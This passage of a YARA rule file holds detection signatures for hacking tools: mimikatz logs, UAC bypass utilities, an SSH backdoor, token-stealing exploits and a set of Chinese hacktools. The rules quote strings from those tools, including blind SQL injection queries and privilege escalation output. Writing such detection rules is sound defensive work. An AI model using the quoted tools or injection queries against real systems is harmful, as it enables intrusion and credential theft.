		$hex_bkey		= { 4b 53 53 4d [20-70] 05 00 01 00}

		$fp1 			= "Sysinternals" ascii
		$fp2			= "Apple Inc." ascii wide
	condition:
		uint16(0) == 0x5a4d and
		(($str_sam_inc and not $str_sam_exc) or $hex_api_call or $str_msv_lsa or $hex_bkey )
		and not 1 of ($fp*)
		and not filename contains "Regdat"
      and not filetype == "EXE"
		and not filepath contains "Dr Watson"
		and not extension == "vbs"
}

rule Mimikatz_Logfile
{
	meta:
		description = "Detects a log file generated by malicious hack tool mimikatz"
		author = "Florian Roth"
		score = 80
		date = "2015/03/31"
	strings:
		$s1 = "SID               :" ascii fullword
		$s2 = "* NTLM     :" ascii fullword
		$s3 = "Authentication Id :" ascii fullword
		$s4 = "wdigest :" ascii fullword
	condition:
		all of them
}

rule custom_ssh_backdoor_server {
	meta:
		description = "Custome SSH backdoor based on python and paramiko - file server.py"
		author = "Florian Roth"
		reference = "https://goo.gl/S46L3o"
		date = "2015-05-14"
		hash = "0953b6c2181249b94282ca5736471f85d80d41c9"
	strings:
		$s0 = "command= raw_input(\"Enter command: \").strip('n')" fullword ascii
		$s1 = "print '[-] (Failed to load moduli -- gex will be unsupported.)'" fullword ascii
		$s2 = "print '[-] Listen/bind/accept failed: ' + str(e)" fullword ascii
		$s3 = "chan.send(command)" fullword ascii
		$s4 = "print '[-] SSH negotiation failed.'" fullword ascii
		$s5 = "except paramiko.SSHException, x:" fullword ascii
	condition:
		filesize < 10KB and 5 of them
}


rule Win7Elevatev2 {
	meta:
		description = "Detects Win7Elevate - Windows UAC bypass utility"
		author = "Florian Roth"
		reference = "http://www.pretentiousname.com/misc/W7E_Source/Win7Elevate_Inject.cpp.html"
		date = "2015-05-14"
		hash1 = "4f53ff6a04e46eda92b403faf42219a545c06c29" /* x64 */
		hash2 = "808d04c187a524db402c5b2be17ce799d2654bd1" /* x86 */
		score = 50
	strings:
		$x1 = "This program attempts to bypass Windows 7's default UAC settings to run " wide
		$x2 = "Win7ElevateV2\\x64\\Release\\" ascii
		$x3 = "Run the command normally (without code injection)" wide
		$x4 = "Inject file copy && elevate command" fullword wide
		$x5 = "http://www.pretentiousname.com/misc/win7_uac_whitelist2.html" fullword wide
		$x6 = "For injection, pick any unelevated Windows process with ASLR on:" fullword wide

		$s1 = "\\cmd.exe" wide
		$s2 = "runas" wide
		$s3 = "explorer.exe" wide
		$s4 = "Couldn't load kernel32.dll" wide
		$s5 = "CRYPTBASE.dll" wide
		$s6 = "shell32.dll" wide
		$s7 = "ShellExecuteEx" ascii
		$s8 = "COMCTL32.dll" ascii
		$s9 = "ShellExecuteEx" ascii
		$s10 = "HeapAlloc" ascii
	condition:
		uint16(0) == 0x5a4d and ( 1 of ($x*) or all of ($s*) )
}

rule UACME_Akagi {
	meta:
		description = "Rule to detect UACMe - abusing built-in Windows AutoElevate backdoor"
		author = "Florian Roth"
		reference = "https://github.com/hfiref0x/UACME"
		date = "2015-05-14"
		hash1 = "edd2138bbd9e76c343051c6dc898054607f2040a"
		hash2 = "e3a919ccc2e759e618208ededa8a543954d49f8a"
		score = 50
	strings:
		$x1 = "UACMe injected, Fubuki at your service." wide fullword
		$x3 = "%temp%\\Hibiki.dll" fullword wide
		$x4 = "[UCM] Cannot write to the target process memory." fullword wide

		$s1 = "%systemroot%\\system32\\cmd.exe" wide
		$s2 = "D:(A;;GA;;;WD)" wide
		$s3 = "%systemroot%\\system32\\sysprep\\sysprep.exe" fullword wide
		$s4 = "/c wusa %ws /extract:%%windir%%\\system32" fullword wide
		$s5 = "Fubuki.dll" ascii fullword

		$l1 = "ntdll.dll" ascii
		$l2 = "Cabinet.dll" ascii
		$l3 = "GetProcessHeap" ascii
		$l4 = "WriteProcessMemory" ascii
		$l5 = "ShellExecuteEx" ascii
	condition:
		( 1 of ($x*) ) or ( 3 of ($s*) and all of ($l*) )
}

rule UACElevator {
	meta:
		description = "UACElevator bypassing UAC - file UACElevator.exe"
		author = "Florian Roth"
		reference = "https://github.com/MalwareTech/UACElevator"
		date = "2015-05-14"
		hash = "fd29d5a72d7a85b7e9565ed92b4d7a3884defba6"
		score = 50
	strings:
		$x1 = "\\UACElevator.pdb" ascii

		$s1 = "%userprofile%\\Downloads\\dwmapi.dll" fullword ascii
		$s2 = "%windir%\\system32\\dwmapi.dll" fullword ascii
		$s3 = "Infection module: %s" fullword ascii
		$s4 = "Could not save module to %s" fullword ascii
		$s5 = "%s%s%p%s%ld%s%d%s" fullword ascii
		$s6 = "Stack area around _alloca memory reserved by this function is corrupted" fullword ascii
		$s7 = "Stack around the variable '" fullword ascii
		$s8 = "MSVCR120D.dll" fullword wide
		$s9 = "Address: 0x" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 172KB and
			( $x1 or 8 of ($s*) )
}

rule s4u {
	meta:
		description = "Detects s4u executable which allows the creation of a cmd.exe with the context of any user without requiring the password. - file s4u.exe"
		author = "Florian Roth"
		reference = "https://github.com/aurel26/s-4-u-for-windows"
		date = "2015-06-05"
		hash = "cfc18f3d5306df208461459a8e667d89ce44ed77"
	strings:
		// Specific strings (may change)
		$x0 = "s4u.exe Domain\\Username [Extra SID]" fullword ascii
		$x1 = "\\Release\\s4u.pdb" ascii

		// Less specific strings
		$s0 = "CreateProcessAsUser failed (error %u)." fullword ascii
		$s1 = "GetTokenInformation failed (error: %u)." fullword ascii
		$s2 = "LsaLogonUser failed (error 0x%x)." fullword ascii
		$s3 = "LsaLogonUser: OK, LogonId: 0x%x-0x%x" fullword ascii
		$s4 = "LookupPrivilegeValue failed (error: %u)." fullword ascii
		$s5 = "The token does not have the specified privilege (%S)." fullword ascii
		$s6 = "Unable to parse command line." fullword ascii
		$s7 = "Unable to find logon SID." fullword ascii
		$s8 = "AdjustTokenPrivileges failed (error: %u)." fullword ascii
		$s9 = "AdjustTokenPrivileges (%S): OK" fullword ascii

		// Generic
		$g1 = "%systemroot%\\system32\\cmd.exe" wide
		$g2 = "SeTcbPrivilege" wide
		$g3 = "winsta0\\default" wide
		$g4 = ".rsrc"
		$g5 = "HeapAlloc"
		$g6 = "GetCurrentProcess"
		$g7 = "HeapFree"
		$g8 = "GetProcessHeap"
		$g9 = "ExpandEnvironmentStrings"
		$g10 = "ConvertStringSidToSid"
		$g11 = "LookupPrivilegeValue"
		$g12 = "AllocateLocallyUniqueId"
		$g13 = "ADVAPI32.dll"
		$g14 = "LsaLookupAuthenticationPackage"
		$g15 = "Secur32.dll"
		$g16 = "MSVCR120.dll"

	condition:
		uint16(0) == 0x5a4d and filesize < 60KB and ( 1 of ($x*) or all of ($s*) or all of ($g*) )
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-06-13
	Identifier: CN-Tools Hacktools
	Reference: Diclosed hacktool set at http://w2op.us/ (Mirror: http://tools.zjqhr.com)
*/

rule mswin_check_lm_group {
	meta:
		description = "Chinese Hacktool Set - file mswin_check_lm_group.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "115d87d7e7a3d08802a9e5fd6cd08e2ec633c367"
	strings:
		$s1 = "Valid_Global_Groups: checking group membership of '%s\\%s'." fullword ascii
		$s2 = "Usage: %s [-D domain][-G][-P][-c][-d][-h]" fullword ascii
		$s3 = "-D    default user Domain" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 380KB and all of them
}

rule WAF_Bypass {
	meta:
		description = "Chinese Hacktool Set - file WAF-Bypass.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "860a9d7aac2ce3a40ac54a4a0bd442c6b945fa4e"
	strings:
		$s1 = "Email: blacksplitn@gmail.com" fullword wide
		$s2 = "User-Agent:" fullword wide
		$s3 = "Send Failed.in RemoteThread" fullword ascii
		$s4 = "www.example.com" fullword wide
		$s5 = "Get Domain:%s IP Failed." fullword ascii
		$s6 = "Connect To Server Failed." fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 7992KB and 5 of them
}

rule Guilin_veterans_cookie_spoofing_tool {
	meta:
		description = "Chinese Hacktool Set - file Guilin veterans cookie spoofing tool.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "06b1969bc35b2ee8d66f7ce8a2120d3016a00bb1"
	strings:
		$s0 = "kernel32.dll^G" fullword ascii
		$s1 = "\\.Sus\"B" fullword ascii
		$s4 = "u56Load3" fullword ascii
		$s11 = "O MYTMP(iM) VALUES (" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1387KB and all of them
}

rule MarathonTool {
	meta:
		description = "Chinese Hacktool Set - file MarathonTool.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "084a27cd3404554cc799d0e689f65880e10b59e3"
	strings:
		$s0 = "MarathonTool" ascii
		$s17 = "/Blind SQL injection tool based in heavy queries" fullword ascii
		$s18 = "SELECT UNICODE(SUBSTRING((system_user),{0},1))" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 1040KB and all of them
}

rule PLUGIN_TracKid {
	meta:
		description = "Chinese Hacktool Set - file TracKid.dll"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "a114181b334e850d4b33e9be2794f5bb0eb59a09"
	strings:
		$s0 = "E-mail: cracker_prince@163.com" fullword ascii
		$s1 = ".\\TracKid Log\\%s.txt" fullword ascii
		$s2 = "Coded by prince" fullword ascii
		$s3 = "TracKid.dll" fullword ascii
		$s4 = ".\\TracKid Log" fullword ascii
		$s5 = "%08x -- %s" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and 3 of them
}

rule Pc_pc2015 {
	meta:
		description = "Chinese Hacktool Set - file pc2015.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "de4f098611ac9eece91b079050b2d0b23afe0bcb"
	strings:
		$s0 = "\\svchost.exe" fullword ascii
		$s1 = "LON\\OD\\O-\\O)\\O%\\O!\\O=\\O9\\O5\\O1\\O" fullword ascii
		$s8 = "%s%08x.001" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 309KB and all of them
}

rule sekurlsa {
	meta:
		description = "Chinese Hacktool Set - file sekurlsa.dll"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "6acecd18fc7da1c5eb0d04e848aae9ce59d2b1b5"
	strings:
		$s1 = "Bienvenue dans un processus distant" fullword wide
		$s2 = "Format d'appel invalide : addLogonSession [idSecAppHigh] idSecAppLow Utilisateur" wide
		$s3 = "SECURITY\\Policy\\Secrets" fullword wide
		$s4 = "Injection de donn" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 1150KB and all of them
}

rule mysqlfast {
	meta:
		description = "Chinese Hacktool Set - file mysqlfast.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "32b60350390fe7024af7b4b8fbf50f13306c546f"
	strings:
		$s2 = "Invalid password hash: %s" fullword ascii
		$s3 = "-= MySql Hash Cracker =- " fullword ascii
		$s4 = "Usage: %s hash" fullword ascii
		$s5 = "Hash: %08lx%08lx" fullword ascii
		$s6 = "Found pass: " fullword ascii
		$s7 = "Pass not found" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 900KB and 4 of them
}

rule DTools2_02_DTools {
	meta:
		description = "Chinese Hacktool Set - file DTools.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "9f99771427120d09ec7afa3b21a1cb9ed720af12"
	strings:
		$s0 = "kernel32.dll" ascii
		$s1 = "TSETPASSWORDFORM" fullword wide
		$s2 = "TGETNTUSERNAMEFORM" fullword wide
		$s3 = "TPORTFORM" fullword wide
		$s4 = "ShellFold" fullword ascii
		$s5 = "DefaultPHotLigh" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 2000KB and all of them
}

rule dll_PacketX {
	meta:
		description = "Chinese Hacktool Set - file PacketX.dll - ActiveX wrapper for WinPcap packet capture library"
		author = "Florian Roth"
		score = 50
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "3f0908e0a38512d2a4fb05a824aa0f6cf3ba3b71"
	strings:
		$s9 = "[Failed to load winpcap packet.dll." wide
		$s10 = "PacketX Version" wide
	condition:
		uint16(0) == 0x5a4d and filesize < 1920KB and all of them
}

rule SqlDbx_zhs {
	meta:
		description = "Chinese Hacktool Set - file SqlDbx_zhs.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "e34228345498a48d7f529dbdffcd919da2dea414"
	strings:
		$s0 = "S.failed_logins \"Failed Login Attempts\", " fullword ascii
		$s7 = "SELECT ROLE, PASSWORD_REQUIRED FROM SYS.DBA_ROLES ORDER BY ROLE" fullword ascii
		$s8 = "SELECT spid 'SPID', status 'Status', db_name (dbid) 'Database', loginame 'Login'" ascii
		$s9 = "bcp.exe <:schema:>.<:table:> out \"<:file:>\" -n -S <:server:> -U <:user:> -P <:" ascii
		$s11 = "L.login_policy_name AS \"Login Policy\", " fullword ascii
		$s12 = "mailto:support@sqldbx.com" fullword ascii
		$s15 = "S.last_login_time \"Last Login\", " fullword ascii
	condition:
		uint16(0) == 0x5a4d and 4 of them
}

rule ms10048_x86 {
	meta:
		description = "Chinese Hacktool Set - file ms10048-x86.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "e57b453966e4827e2effa4e153f2923e7d058702"
	strings:
		$s1 = "[ ] Resolving PsLookupProcessByProcessId" fullword ascii
		$s2 = "The target is most likely patched." fullword ascii
		$s3 = "Dojibiron by Ronald Huizer, (c) master@h4cker.us ." fullword ascii
		$s4 = "[ ] Creating evil window" fullword ascii
		$s5 = "%sHANDLEF_INDESTROY" fullword ascii
		$s6 = "[+] Set to %d exploit half succeeded" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and 4 of them
}

rule Dos_ch {
	meta:
		description = "Chinese Hacktool Set - file ch.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "60bbb87b08af840f21536b313a76646e7c1f0ea7"
	strings:
		$s0 = "/Churraskito/-->Usage: Churraskito.exe \"command\" " fullword ascii
		$s4 = "fuck,can't find WMI process PID." fullword ascii
		$s5 = "/Churraskito/-->Found token %s " fullword ascii
		$s8 = "wmiprvse.exe" fullword ascii
		$s10 = "SELECT * FROM IIsWebInfo" fullword ascii
		$s17 = "WinSta0\\Default" fullword ascii  /* Goodware String - occured 22 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 260KB and 3 of them
}

rule DUBrute_DUBrute {
	meta:
		description = "Chinese Hacktool Set - file DUBrute.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "8aaae91791bf782c92b97c6e1b0f78fb2a9f3e65"
	strings:
		$s1 = "IP - %d; Login - %d; Password - %d; Combination - %d" fullword ascii
		$s2 = "IP - 0; Login - 0; Password - 0; Combination - 0" fullword ascii
		$s3 = "Create %d IP@Loginl;Password" fullword ascii
		$s4 = "UBrute.com" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1020KB and all of them
}

rule ChineseHack_Tool {
	meta:
		description = "Chinese Hacktool Set - file CookieTools.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "b6a3727fe3d214f4fb03aa43fb2bc6fadc42c8be"
	strings:
		$s1 = "http://210.73.64.88/doorway/cgi-bin/getclientip.asp?IP=" fullword ascii
		$s2 = "No data to read.$Can not bind in port range (%d - %d)" fullword wide
		$s3 = "Connection Closed Gracefully.;Could not bind socket. Address and port are alread" wide
		$s4 = "OnGetPasswordP" fullword ascii
		$s5 = "http://www.chinesehack.org/" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 5000KB and 4 of them
}

rule update_PcInit {
	meta:
		description = "Chinese Hacktool Set - file PcInit.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "a6facc4453f8cd81b8c18b3b3004fa4d8e2f5344"
	strings:
		$s1 = "\\svchost.exe" fullword ascii
		$s2 = "%s%08x.001" fullword ascii
		$s3 = "Global\\ps%08x" fullword ascii
		$s4 = "drivers\\" fullword ascii /* Goodware String - occured 2 times */
		$s5 = "StrStrA" fullword ascii /* Goodware String - occured 43 times */
		$s6 = "StrToIntA" fullword ascii /* Goodware String - occured 44 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 50KB and all of them
}

rule dat_NaslLib {
	meta:
		description = "Chinese Hacktool Set - file NaslLib.dll"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "fb0d4263118faaeed2d68e12fab24c59953e862d"
	strings:
		$s1 = "nessus_get_socket_from_connection: fd <%d> is closed" fullword ascii
		$s2 = "[*] \"%s\" completed, %d/%d/%d/%d:%d:%d - %d/%d/%d/%d:%d:%d" fullword ascii
		$s3 = "A FsSniffer backdoor seems to be running on this port%s" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1360KB and all of them
}

rule Dos_1 {
	meta:
		description = "Chinese Hacktool Set - file 1.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "b554f0687a12ec3a137f321cc15e052ff219f28c"
	strings:
		$s1 = "/churrasco/-->Usage: Churrasco.exe \"command to run\"" fullword ascii
		$s2 = "/churrasco/-->Done, command should have ran as SYSTEM!" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and all of them
}

rule OtherTools_servu {
	meta:
		description = "Chinese Hacktool Set - file svu.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "5c64e6879a9746a0d65226706e0edc7a"
	strings:
		$s0 = "MZKERNEL32.DLL" fullword ascii
		$s1 = "UpackByDwing@" fullword ascii
		$s2 = "GetProcAddress" fullword ascii
		$s3 = "WriteFile" fullword ascii
	condition:
		$s0 at 0 and filesize < 50KB and all of them
}

rule ustrrefadd {
	meta:
		description = "Chinese Hacktool Set - file ustrrefadd.dll"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "b371b122460951e74094f3db3016264c9c8a0cfa"
	strings:
		$s0 = "E-Mail  : admin@luocong.com" fullword ascii
		$s1 = "Homepage: http://www.luocong.com" fullword ascii
		$s2 = ": %d  -  " fullword ascii
		$s3 = "ustrreffix.dll" fullword ascii
		$s5 = "Ultra String Reference plugin v%d.%02d" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 320KB and all of them
}

rule XScanLib {
	meta:
		description = "Chinese Hacktool Set - file XScanLib.dll"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "c5cb4f75cf241f5a9aea324783193433a42a13b0"
	strings:
		$s4 = "XScanLib.dll" fullword ascii
		$s6 = "Ports/%s/%d" fullword ascii
		$s8 = "DEFAULT-TCP-PORT" fullword ascii
		$s9 = "PlugCheckTcpPort" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 360KB and all of them
}

rule IDTools_For_WinXP_IdtTool {
	meta:
		description = "Chinese Hacktool Set - file IdtTool.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "ebab6e4cb7ea82c8dc1fe4154e040e241f4672c6"
	strings:
		$s2 = "IdtTool.sys" fullword ascii
		$s4 = "Idt Tool bY tMd[CsP]" fullword wide
		$s6 = "\\\\.\\slIdtTool" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 25KB and all of them
}

rule GoodToolset_ms11046 {
	meta:
		description = "Chinese Hacktool Set - file ms11046.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "f8414a374011fd239a6c6d9c6ca5851cd8936409"
	strings:
		$s1 = "[*] Token system command" fullword ascii
		$s2 = "[*] command add user 90sec 90sec" fullword ascii
		$s3 = "[*] Add to Administrators success" fullword ascii
		$s4 = "[*] User has been successfully added" fullword ascii
		$s5 = "Program: %s%s%s%s%s%s%s%s%s%s%s" fullword ascii  /* Goodware String - occured 3 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 840KB and 2 of them
}

rule Cmdshell32 {
	meta:
		description = "Chinese Hacktool Set - file Cmdshell32.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "3c41116d20e06dcb179e7346901c1c11cd81c596"
	strings:
		$s1 = "cmdshell.exe" fullword wide
		$s2 = "cmdshell" fullword ascii
		$s3 = "[Root@CmdShell ~]#" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 62KB and all of them
}

rule Sniffer_analyzer_SSClone_1210_full_version {
	meta:
		description = "Chinese Hacktool Set - file Sniffer analyzer SSClone 1210 full version.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "6882125babb60bd0a7b2f1943a40b965b7a03d4e"
	strings:
		$s0 = "http://www.vip80000.com/hot/index.html" fullword ascii
		$s1 = "GetConnectString" fullword ascii
		$s2 = "CnCerT.Safe.SSClone.dll" fullword ascii
		$s3 = "(*.JPG;*.BMP;*.GIF;*.ICO;*.CUR)|*.JPG;*.BMP;*.GIF;*.ICO;*.CUR|JPG" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 3580KB and all of them
}

rule x64_klock {
	meta:
		description = "Chinese Hacktool Set - file klock.dll"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "44825e848bc3abdb6f31d0a49725bb6f498e9ccc"
	strings:
		$s1 = "Bienvenue dans un processus distant" fullword wide
		$s2 = "klock.dll" fullword ascii
		$s3 = "Erreur : le bureau courant (" fullword wide
		$s4 = "klock de mimikatz pour Windows" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 907KB and all of them
}

rule Dos_Down32 {
	meta:
		description = "Chinese Hacktool Set - file Down32.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "0365738acd728021b0ea2967c867f1014fd7dd75"
	strings:
		$s2 = "C:\\Windows\\Temp\\Cmd.txt" fullword wide
		$s6 = "down.exe" fullword wide
		$s15 = "get_Form1" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 137KB and all of them
}

rule MarathonTool_2 {
	meta:
		description = "Chinese Hacktool Set - file MarathonTool.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "75b5d25cdaa6a035981e5a33198fef0117c27c9c"
	strings:
		$s3 = "http://localhost/retomysql/pista.aspx?id_pista=1" fullword wide
		$s6 = "SELECT ASCII(SUBSTR(username,{0},1)) FROM USER_USERS" fullword wide
		$s17 = "/Blind SQL injection tool based in heavy queries" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and all of them
}

rule Tools_termsrv {
	meta:
		description = "Chinese Hacktool Set - file termsrv.dll"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "294a693d252f8f4c85ad92ee8c618cebd94ef247"
	strings:
		$s1 = "Iv\\SmSsWinStationApiPort" fullword ascii
		$s2 = " TSInternetUser " fullword wide
		$s3 = "KvInterlockedCompareExchange" fullword ascii
		$s4 = " WINS/DNS " fullword wide
		$s5 = "winerror=%1" fullword wide
		$s6 = "TermService " fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 1150KB and all of them
}

rule scanms_scanms {
	meta:
		description = "Chinese Hacktool Set - file scanms.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "47787dee6ddea2cb44ff27b6a5fd729273cea51a"
	strings:
		$s1 = "--- ScanMs Tool --- (c) 2003 Internet Security Systems ---" fullword ascii
		$s2 = "Scans for systems vulnerable to MS03-026 vuln" fullword ascii
		$s3 = "More accurate for WinXP/Win2k, less accurate for WinNT" fullword ascii /* PEStudio Blacklist: os */
		$s4 = "added %d.%d.%d.%d-%d.%d.%d.%d" fullword ascii
		$s5 = "Internet Explorer 1.0" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 300KB and 3 of them
}

rule CN_Tools_PcShare {
	meta:
		description = "Chinese Hacktool Set - file PcShare.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "ee7ba9784fae413d644cdf5a093bd93b73537652"
	strings:
		$s0 = "title=%s%s-%s;id=%s;hwnd=%d;mainhwnd=%d;mainprocess=%d;cmd=%d;" fullword wide
		$s1 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)" fullword wide
		$s2 = "http://www.pcshares.cn/pcshare200/lostpass.asp" fullword wide
		$s5 = "port=%s;name=%s;pass=%s;" fullword wide
		$s16 = "%s\\ini\\*.dat" fullword wide
		$s17 = "pcinit.exe" fullword wide
		$s18 = "http://www.pcshare.cn" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 6000KB and 3 of them
}

rule pw_inspector {
	meta:
		description = "Chinese Hacktool Set - file pw-inspector.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "4f8e3e101098fc3da65ed06117b3cb73c0a66215"
	strings:
		$s1 = "-m MINLEN  minimum length of a valid password" fullword ascii
		$s2 = "http://www.thc.org" fullword ascii
		$s3 = "Use for hacking: trim your dictionary file to the pw requirements of the target." fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 460KB and all of them
}

rule Dll_LoadEx {
	meta:
		description = "Chinese Hacktool Set - file Dll_LoadEx.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "213d9d0afb22fe723ff570cf69ff8cdb33ada150"
	strings:
		$s0 = "WiNrOOt@126.com" fullword wide
		$s1 = "Dll_LoadEx.EXE" fullword wide
		$s3 = "You Already Loaded This DLL ! :(" fullword ascii
		$s10 = "Dll_LoadEx Microsoft " fullword wide
		$s17 = "Can't Load This Dll ! :(" fullword ascii
		$s18 = "WiNrOOt" fullword wide
		$s20 = " Dll_LoadEx(&A)..." fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 120KB and 3 of them
}

rule dat_report {
	meta:
		description = "Chinese Hacktool Set - file report.dll"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "4582a7c1d499bb96dad8e9b227e9d5de9becdfc2"
	strings:
		$s1 = "<a href=\"http://www.xfocus.net\">X-Scan</a>" fullword ascii
		$s2 = "REPORT-ANALYSIS-OF-HOST" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 480KB and all of them
}

rule Dos_iis7 {
	meta:
		description = "Chinese Hacktool Set - file iis7.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "0a173c5ece2fd4ac8ecf9510e48e95f43ab68978"
	strings:
		$s0 = "\\\\localhost" fullword ascii
		$s1 = "iis.run" fullword ascii
		$s3 = ">Could not connecto %s" fullword ascii
		$s5 = "WHOAMI" ascii
		$s13 = "WinSta0\\Default" fullword ascii  /* Goodware String - occured 22 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 140KB and all of them
}

rule SwitchSniffer {
	meta:
		description = "Chinese Hacktool Set - file SwitchSniffer.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "1e7507162154f67dff4417f1f5d18b4ade5cf0cd"
	strings:
		$s0 = "NextSecurity.NET" fullword wide
		$s2 = "SwitchSniffer Setup" fullword wide
	condition:
		uint16(0) == 0x5a4d and all of them
}

rule SQLCracker {
	meta:
		description = "Chinese Hacktool Set - file SQLCracker.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "1aa5755da1a9b050c4c49fc5c58fa133b8380410"
	strings:
		$s0 = "msvbvm60.dll" fullword ascii /* reversed goodware string 'lld.06mvbvsm' */
		$s1 = "_CIcos" fullword ascii
		$s2 = "kernel32.dll" fullword ascii
		$s3 = "cKmhV" fullword ascii
		$s4 = "080404B0" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 125KB and all of them
}

rule FreeVersion_debug {
	meta:
		description = "Chinese Hacktool Set - file debug.exe"
		author = "Florian Roth"
		score = 70
		reference = "http://tools.zjqhr.com/"
		date = "2015-06-13"
		hash = "d11e6c6f675b3be86e37e50184dadf0081506a89"
	strings:
		$s0 = "c:\\Documents and Settings\\Administrator\\" fullword ascii
		$s1 = "Got WMI process Pid: %d" ascii
		$s2 = "This exploit will execute" ascii
		$s6 = "Found token %s " ascii
		$s7 = "Running reverse shell" ascii
		$s10 = "wmiprvse.exe" fullword ascii
		$s12 = "SELECT * FROM IIsWebInfo" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 820KB and 3 of them
}

rule Dos_look {
	meta:
